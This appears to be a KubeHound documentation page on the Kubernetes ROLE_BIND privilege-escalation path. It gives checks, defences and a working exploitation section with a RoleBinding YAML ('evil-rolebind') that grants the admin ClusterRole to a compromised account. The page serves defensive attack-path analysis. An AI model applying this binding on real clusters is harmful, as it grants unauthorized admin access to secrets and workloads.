---
title: ROLE_BIND
---

<!--
id: ROLE_BIND
name: "Create role binding"
mitreAttackTechnique: T1078 - Valid Accounts
mitreAttackTactic: TA0004 - Privilege Escalation
-->


# ROLE_BIND

A role that grants permission to create or modify `(Cluster)RoleBindings` can allow an attacker to escalate privileges on a compromised user.

| Source                                    | Destination                           | MITRE                            |
| ----------------------------------------- | ------------------------------------- |----------------------------------|
| [PermissionSet](../entities/permissionset.md)  | [PermissionSet](../entities/permissionset.md) | [Valid Accounts, T1078](https://attack.mitre.org/techniques/T1078/) |

## Details

An attacker with sufficient permission can create a `RoleBinding` with the default existing admin `ClusterRole` and bind it to a compromised user. By creating this `RoleBinding`, the compromised user becomes highly privileged, and can execute privileged operations in the cluster (reading secrets, creating pods, etc.).

## Prerequisites

Ability to interact with the K8s API with a role allowing modify or create access to `(Cluster)RoleBindings`.

See the [example pod spec](https://github.com/DataDog/KubeHound/tree/main/test/setup/test-cluster/attacks/ROLE_BIND.yaml).

## Checks

Simply ask kubectl:

```bash
kubectl auth can-i create rolebinding
kubectl auth can-i bind role
```

## Exploitation

Create the `(Cluster)RoleBinding` definition as below:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: evil-rolebind
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: admin
subjects:
  - kind: ServiceAccount
    name: <compromised user>
    namespace: default
```

Create the binding via kubectl:

```bash
kubebctl apply -f evil-rolebind-spec.yaml
```

## Defences

### Monitoring

+ Monitor anomalous access to the K8s authorization API including creating privileged `(Cluster)RoleBinding` from with a pod, unusual `User-Agent` headers and other outliers.

### Implement least privilege access

Creating `(Cluster)RoleBinding` is a very powerful privilege and should not be required by the majority of users. Use an automated tool such a KubeHound to search for any risky permissions and users in the cluster and look to eliminate them.

## Calculation

+ [RoleBind](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/role_bind.go)
+ [RoleBindNamespace](https://github.com/DataDog/KubeHound/tree/main/pkg/kubehound/graph/edge/role_bind_namespace.go)

## References:

+ [Official Kubernetes Documentation:Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#rolebinding-and-clusterrolebinding)
+ [Securing Kubernetes Clusters by Eliminating Risky Permissions](https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions)
